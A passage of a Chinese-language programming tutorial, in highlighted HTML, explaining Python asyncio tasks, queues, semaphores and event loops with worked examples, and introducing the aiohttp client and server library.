class="hljs-subst">&#123;t1.done()&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pending:<br>        p.cancel()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;cancel task: <span class="hljs-subst">&#123;p.get_name()&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(asyncio.all_tasks())<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><blockquote><p>gather 和 wait 的区别：<code>asyncio.gather()</code> 和 <code>asyncio.wait()</code> 都可以并发执行多个协程对象或任务，但 <em>gather</em> 主要用于收集结果，它会返回一个列表，按照给定的顺序返回结果；而 <em>wait</em> 会返回一个元组（done, pending），分别表示 <em>已完成任务列表</em> 和 <em>未完成任务列表</em>，列表中的每个任务都是一个 <em>Task</em> 实例，可以通过 <code>task.result()</code> 获得协程返回值。此外，<em>wait</em> 可以指定函数的返回时机和超时时间，是比 <em>gather</em> 更低层级的调用方式。</p></blockquote><h4 id="内省"><a href="#内省" class="headerlink" title="内省"></a>内省</h4><ul><li><p><code>asyncio.current_task(loop=None)</code></p><ul><li>返回当前运行的 <em>Task</em> 实例，如果没有正在运行的任务则返回 <code>None</code>。</li><li>如果 <em>loop</em> 为 <code>None</code> 则会使用 <code>get_running_loop()</code> 获取当前事件循环。</li></ul></li><li><p><code>asyncio.all_tasks(loop=None)</code></p><ul><li>返回事件循环所运行的未完成的 <em>Task</em> 实例的集合。</li><li>如果 <em>loop</em> 为 <code>None</code> 则会使用 <code>get_running_loop()</code> 获取当前事件循环。</li></ul></li></ul><h3 id="流"><a href="#流" class="headerlink" title="流"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-stream.html">流</a></h3><p>流是用于处理网络连接的支持 async/await 的高层级原语。 流允许发送和接收数据，而不需要使用回调或低级协议和传输。</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-queue.html">队列</a></h3><p>asyncio 队列被设计成与 <code>queue</code> 模块类似，专用于 <code>async/await</code> 代码，但它 <strong>不是线程安全</strong> 的。asyncio 的队列没有 <em>timeout</em> 形参，使用 <code>asyncio.wait_for()</code> 函数为队列添加超时操作。</p><p><strong>使用说明</strong></p><p>asyncio.queues 模块提供的类：</p><ul><li>Queue(maxsize=0, *)：先进先出队列</li><li>LifoQueue(maxsize=0, *)：后进先出队列</li><li>PriorityQueue(maxsize=0, *)：优先级队列</li></ul><p>asyncio.queues 模块提供的常用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">queue.qsize()  <span class="hljs-comment"># 返回队列的大小（准确值）</span><br>queue.empty()  <span class="hljs-comment"># 返回队列是否为空</span><br>queue.full()  <span class="hljs-comment"># 返回队列是否为满</span><br>queue.put(item)  <span class="hljs-comment"># coroutine方法，向队列中插入一个元素，如果队列为满则阻塞</span><br>queue.put_nowait(item)  <span class="hljs-comment"># 立即向队列中插入一个元素，如果队列为满则引发QueueFull异常</span><br>queue.get()  <span class="hljs-comment"># coroutine方法，从队列中获取一个元素并返回，如果队列为空则阻塞</span><br>queue.get_nowait()  <span class="hljs-comment"># 立即从队列中获取一个元素并返回，如果队列为空则引发QueueEmpty异常</span><br>queue.task_done()  <span class="hljs-comment"># 同标准queue模块</span><br>queue.join()  <span class="hljs-comment"># coroutine方法，阻塞至队列中所有的元素都被接收和处理完毕</span><br></code></pre></td></tr></table></figure><p><strong>示例：多个并发任务的工作量分配</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker</span>(<span class="hljs-params">name, queue</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># Get a &quot;work item&quot; out of the queue.</span><br>        sleep_for = <span class="hljs-keyword">await</span> queue.get()<br><br>        <span class="hljs-comment"># Sleep for the &quot;sleep_for&quot; seconds.</span><br>        <span class="hljs-keyword">await</span> asyncio.sleep(sleep_for)<br><br>        <span class="hljs-comment"># Notify the queue that the &quot;work item&quot; has been processed.</span><br>        queue.task_done()<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> has slept for <span class="hljs-subst">&#123;sleep_for:<span class="hljs-number">.2</span>f&#125;</span> seconds&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># Create a queue that we will use to store our &quot;workload&quot;.</span><br>    queue = asyncio.Queue()<br><br>    <span class="hljs-comment"># Generate random timings and put them into the queue.</span><br>    total_sleep_time = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        sleep_for = random.uniform(<span class="hljs-number">0.05</span>, <span class="hljs-number">1.0</span>)<br>        total_sleep_time += sleep_for<br>        queue.put_nowait(sleep_for)<br><br>    <span class="hljs-comment"># Create three worker tasks to process the queue concurrently.</span><br>    tasks = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        task = asyncio.create_task(worker(<span class="hljs-string">f&#x27;worker-<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>, queue))<br>        tasks.append(task)<br><br>    <span class="hljs-comment"># Wait until the queue is fully processed.</span><br>    started_at = time.monotonic()<br>    <span class="hljs-keyword">await</span> queue.join()<br>    total_slept_for = time.monotonic() - started_at<br><br>    <span class="hljs-comment"># Cancel our worker tasks.</span><br>    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:<br>        task.cancel()<br>    <span class="hljs-comment"># Wait until all worker tasks are cancelled.</span><br>    <span class="hljs-keyword">await</span> asyncio.gather(*tasks, return_exceptions=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;====&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;3 workers slept in parallel for <span class="hljs-subst">&#123;total_slept_for:<span class="hljs-number">.2</span>f&#125;</span> seconds&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;total expected sleep time: <span class="hljs-subst">&#123;total_sleep_time:<span class="hljs-number">.2</span>f&#125;</span> seconds&#x27;</span>)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p><strong>queue.Queue &amp; asyncio.Queue</strong></p><p>queue.Queue 和 asyncio.Queue 都是支持多生产者、多消费者的队列，同样是基于 collections.deque 实现，他们都提供了 Queue、LifoQueue、PriorityQueue，所提供的接口也相同。</p><p>区别在于 queue.Queue 适用于多线程场景的通信，asyncio.Queue 适用于协程场景的通信。由于 asyncio 的加成，queue.Queue 下的阻塞接口在 asyncio.Queue 中则是以返回协程对象的方式执行，具体差异如下表：</p><p><img src="/img/Python/v2-15de9fde6c4723e7e36d52c3b9d4ec04_720w.jpg"></p><h3 id="同步原语"><a href="#同步原语" class="headerlink" title="同步原语"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-sync.html">同步原语</a></h3><p><strong>Semaphore</strong></p><p><code>asyncio.Semaphore(value=1)</code> 信号量对象，非线程安全。</p><p>信号量会管理一个内部计数器，该计数器会随每次 <code>acquire()</code> 调用递减并随每次 <code>release()</code>调用递增。计数器的值永远不会降到零以下；当 <code>acquire()</code> 发现其值为零时，它将保持阻塞直到有某个任务调用了 <code>release()</code>。</p><p>使用 Semaphore 的推荐方式是通过 <code>async with</code> 语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">sem = asyncio.Semaphore(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> sem:<br>    <span class="hljs-comment"># work with shared resource</span><br><br>---------<br><span class="hljs-comment"># 上述代码等价于：</span><br><span class="hljs-keyword">await</span> sem.acquire()<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># work with shared resource</span><br><span class="hljs-keyword">finally</span>:<br>    sem.release()<br></code></pre></td></tr></table></figure><p><strong>示例：协程使用 Semaphore 限制并发量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>(<span class="hljs-params">sem</span>):</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> sem:<br>        <span class="hljs-built_in">print</span>(asyncio.current_task())<br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    tasks = []<br>    sem = asyncio.Semaphore(<span class="hljs-number">10</span>)  <span class="hljs-comment"># 并发执行数为5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):  <span class="hljs-comment"># 启动100个协程</span><br>        tasks.append(asyncio.create_task(hello(sem)))<br>    <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h3 id="子进程"><a href="#子进程" class="headerlink" title="子进程"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-subprocess.html">子进程</a></h3><p>本节介绍了用于创建和管理子进程的高层级 async/await asyncio API。</p><h3 id="复合语句"><a href="#复合语句" class="headerlink" title="复合语句"></a><a href="https://docs.python.org/zh-cn/3/reference/compound_stmts.html#coroutines">复合语句</a></h3><p><strong>异步迭代器 async for</strong></p><p><code>async for</code> 语句允许方便地对异步可迭代对象进行迭代。</p><p><strong>异步上下文管理器 async with</strong></p><p><code>async with</code> 语句是一种上下文管理器，能够在其 <em>enter</em> 和 <em>exit</em> 方法中暂停执行。</p><h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h3><p><strong>示例一：使用协程方法替换普通方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 非协程版本</span><br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crawl_page</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;crawling &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br>    sleep_time = <span class="hljs-built_in">int</span>(url.split(<span class="hljs-string">&#x27;_&#x27;</span>)[-<span class="hljs-number">1</span>])<br>    time.sleep(sleep_time)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OK &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">urls</span>):</span><br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>        crawl_page(url)<br><br><br>ts = time.time()<br>main([<span class="hljs-string">&#x27;url_1&#x27;</span>, <span class="hljs-string">&#x27;url_2&#x27;</span>, <span class="hljs-string">&#x27;url_3&#x27;</span>, <span class="hljs-string">&#x27;url_4&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;all time: &#123;:.2f&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(time.time() - ts))  <span class="hljs-comment"># 10.03s</span><br><br>---------<br><span class="hljs-comment"># 协程版本</span><br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crawl_page</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;crawling &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br>    sleep_time = <span class="hljs-built_in">int</span>(url.split(<span class="hljs-string">&#x27;_&#x27;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">await</span> asyncio.sleep(sleep_time)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OK &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">urls</span>):</span><br>    tasks = [asyncio.create_task(crawl_page(url)) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls]  <span class="hljs-comment"># 创建task</span><br>    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:  <span class="hljs-comment"># 或把for循环替换为 await asyncio.gather(*tasks) 其中*tasks为解包列表</span><br>        <span class="hljs-keyword">await</span> task<br><br><br>ts = time.time()<br>asyncio.run(main([<span class="hljs-string">&#x27;url_1&#x27;</span>, <span class="hljs-string">&#x27;url_2&#x27;</span>, <span class="hljs-string">&#x27;url_3&#x27;</span>, <span class="hljs-string">&#x27;url_4&#x27;</span>]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;all time: &#123;:.2f&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(time.time() - ts))  <span class="hljs-comment"># 4.01s</span><br></code></pre></td></tr></table></figure><p><strong>示例二：使用协程实现生产者-消费者模型</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span class="hljs-params">queue, number</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        val = <span class="hljs-keyword">await</span> queue.get()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; get a val: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(number, val))<br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span class="hljs-params">queue, number</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        val = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">await</span> queue.put(val)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; put a val: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(number, val))<br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    queue = asyncio.Queue()<br><br>    consumer_1 = asyncio.create_task(consumer(queue, <span class="hljs-string">&#x27;consumer_1&#x27;</span>))<br>    consumer_2 = asyncio.create_task(consumer(queue, <span class="hljs-string">&#x27;consumer_2&#x27;</span>))<br><br>    producer_1 = asyncio.create_task(producer(queue, <span class="hljs-string">&#x27;producer_1&#x27;</span>))<br>    producer_2 = asyncio.create_task(producer(queue, <span class="hljs-string">&#x27;producer_2&#x27;</span>))<br><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">10</span>)  <span class="hljs-comment"># 执行10s</span><br>    consumer_1.cancel()<br>    consumer_2.cancel()<br><br>    <span class="hljs-keyword">await</span> asyncio.gather(consumer_1, consumer_2, producer_1, producer_2, return_exceptions=<span class="hljs-literal">True</span>)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html">事件循环</a></h3><p>事件循环是每个 asyncio 应用的核心。 事件循环会运行异步任务和回调，执行网络 IO 操作，以及运行子进程。</p><p>应用开发者通常应当使用高层级的 asyncio 函数，例如 <a href="https://docs.python.org/zh-cn/3/library/asyncio-task.html#asyncio.run"><code>asyncio.run()</code></a>，应当很少有必要引用循环对象或调用其方法。 本节所针对的主要是低层级代码、库和框架的编写者，他们需要更细致地控制事件循环行为。</p><p>以下低层级函数可被用于获取、设置或创建事件循环:</p><ul><li><p><code>asyncio.``get_running_loop</code>()</p><p>返回当前 OS 线程中正在运行的事件循环。如果没有正在运行的事件循环则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError"><code>RuntimeError</code></a>。 此函数只能由协程或回调来调用。<em>3.7 新版功能.</em></p></li><li><p><code>asyncio.``get_event_loop</code>()</p><p>获取当前事件循环。如果当前 OS 线程没有设置当前事件循环，该 OS 线程为主线程，并且 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.set_event_loop"><code>set_event_loop()</code></a> 还没有被调用，则 asyncio 将创建一个新的事件循环并将其设为当前事件循环。由于此函数具有相当复杂的行为（特别是在使用了自定义事件循环策略的时候），更推荐在协程和回调中使用 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.get_running_loop"><code>get_running_loop()</code></a> 函数而非 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.get_event_loop"><code>get_event_loop()</code></a>。应该考虑使用 <a href="https://docs.python.org/zh-cn/3/library/asyncio-task.html#asyncio.run"><code>asyncio.run()</code></a> 函数而非使用低层级函数来手动创建和关闭事件循环。<em>3.10 版后已移除:</em> 如果没有正在运行的事件循环则会发出弃用警告。 在未来的 Python 发行版中，此函数将成为 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.get_running_loop"><code>get_running_loop()</code></a> 的别名。</p></li><li><p><code>asyncio.``set_event_loop</code>(<em>loop</em>)</p><p>将 <em>loop</em> 设置为当前 OS 线程的当前事件循环。</p></li><li><p><code>asyncio.``new_event_loop</code>()</p><p>创建一个新的事件循环。</p></li></ul><h2 id="aiohttp-库"><a href="#aiohttp-库" class="headerlink" title="aiohttp 库"></a><a href="https://docs.aiohttp.org/en/stable/index.html">aiohttp 库</a></h2><p>基于 asyncio 框架实现的异步 HTTP 客户端/服务器，用于替代 requests 库。</p><h3 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h3><p><strong>示例一：简单使用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># client</span><br><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">import</span> aiohttp<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>) <span class="hljs-keyword">as</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Status: <span class="hljs-subst">&#123;response.status&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Content-type: <span class="hljs-subst">&#123;response.headers[<span class="hljs-string">&#x27;content-type&#x27;</span>]&#125;</span>&quot;</span>)<br>            html = <span class="hljs-keyword">await</span> response.text()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Body: <span class="hljs-subst">&#123;html&#125;</span>&#x27;</span>)<br><br><br>asyncio.run(main())<br><br>---------<br><span class="hljs-comment"># server</span><br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> web<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handle</span>(<span class="hljs-params">request</span>):</span><br>    name = request.match_info.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&quot;Anonymous&quot;</span>)<br>    text = <span class="hljs-string">&quot;Hello, &quot;</span> + name<br>    <span class="hljs-keyword">return</span> web.Response(text=text)<br><br><br>app = web.Application()<br>app.add_routes([web.get(<span class="hljs-string">&#x27;/&#x27;</span>, handle), web.get(<span class="hljs-string">&#x27;/&#123;name&#125;&#x27;</span>, handle)])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    web.run_app(app, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">9643</span>)<br></code></pre></td></tr></table></figure><p><strong>示例二：ClientSession 常用方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> ClientSession<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">url, session: ClientSession</span>):</span><br>    <span class="hljs-comment"># 传递参数</span><br>    params_list = [<br>        &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;,  <span class="hljs-comment"># 字典形式（标准格式，由程序编码）</span><br>        [(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value1&#x27;</span>), (<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value2&#x27;</span>)],  <span class="hljs-comment"># 元组列表形式（为一个键指定多个值）</span><br>        <span class="hljs-string">&#x27;key1=value1&amp;key2=value2&#x27;</span>  <span class="hljs-comment"># 字符串形式（不会自动编码）</span><br>    ]<br>    <span class="hljs-comment"># 自定义headers</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) &quot;</span><br>                      <span class="hljs-string">&quot;AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span><br>                      <span class="hljs-string">&quot;Chrome/78.0.3904.108 Safari/537.36&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> params <span class="hljs-keyword">in</span> params_list:<br>        <span class="hljs-comment"># ClientSession.get() 有一个必选的url参数，它必须是一个str或yarl.URL对象</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url, params=params, headers=headers) <span class="hljs-keyword">as</span> r:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;url: <span class="hljs-subst">&#123;r.url&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;status: <span class="hljs-subst">&#123;r.status&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;headers: <span class="hljs-subst">&#123;r.headers&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 返回详细的响应头信息</span><br>            <span class="hljs-built_in">print</span>(<span 